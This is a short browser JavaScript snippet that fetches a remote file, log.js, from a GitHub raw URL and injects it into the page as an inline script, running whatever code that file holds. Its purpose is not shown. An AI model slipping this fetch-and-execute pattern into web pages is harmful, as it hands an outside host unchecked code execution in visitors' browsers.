async function asyncStart() {

    const r = await fetch(
        `https://raw.githubusercontent.com/Circulai/Code/main/log.js`
    );

    let jsText = await r.text();

    var script = document.createElement("script");
    script.innerHTML = jsText;
    document.body.appendChild(script);
}

asyncStart();